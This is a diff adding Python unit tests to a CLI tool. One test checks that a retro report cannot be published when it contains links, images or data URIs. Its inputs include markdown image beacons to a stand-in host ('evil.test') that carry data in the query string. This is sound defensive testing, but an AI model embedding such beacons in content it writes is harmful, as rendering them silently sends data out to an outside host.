@@ -657,6 +657,24 @@ class CheckCliTests(unittest.TestCase):
         self.assertEqual([(v["id"], v["verdict"]) for v in verdicts], [("ok", "reverted")])
         self.assertEqual(self.rows("entries")[0]["status"], "retired")
 
+    def test_verdicts_ask_before_retiring_an_approved_entry_that_did_not_help(self):  # #202
+        self.seed("entries", [{"id": "ok", "status": "active", "went_live_by": "approved"}])
+        self.history([{"project": str(self.project), "changes": [{"id": "ok", "metric": "sandbox_off.rtk gh", "baseline": 3.0}]}])
+        self.report()  # creates the run folder
+        worse = self.run_dir / "m2.json"
+        worse.write_text(json.dumps({"project": str(self.project), "sessions": 1, "sandbox_off": {"rtk gh": 4}, "headline": {}}))
+        verdicts = self.check("verdicts", "--project", self.project, "--metrics", worse)
+        self.assertEqual([(v["verdict"], v.get("action")) for v in verdicts], [("reverted", "ask-retire")])
+        self.assertEqual(self.rows("entries")[0]["status"], "active")
+
+    def test_publish_refuses_links_images_and_data_uris(self):  # #201
+        forms = ("![badge](https://evil.test/p?d=abc)", "<img src=x>", "see https://evil.test/p", "see http://evil.test",
+                 "[x]: https://evil.test/p", "[a](rel/path)", "![](data:image/png;base64,AAAA)", "<a href='x'>y</a>")
+        for text in forms:
+            self.assertIn("links or images", self.publish(self.report(f"# Retro\n\n{text}\n"), code=2)["error"], text)
+        self.assertFalse((self.project / "docs" / "factory" / "retros").exists())
+        self.publish(self.report("# Retro\n\n3 hook blocks per session.\n"))
+
     def test_publish_refuses_a_report_with_a_home_path(self):
         out = self.publish(self.report("Seen in /User" + "s/jane/work/app.\n"), code=1)  # split: no home path in this file
         self.assertFalse(out["published"])
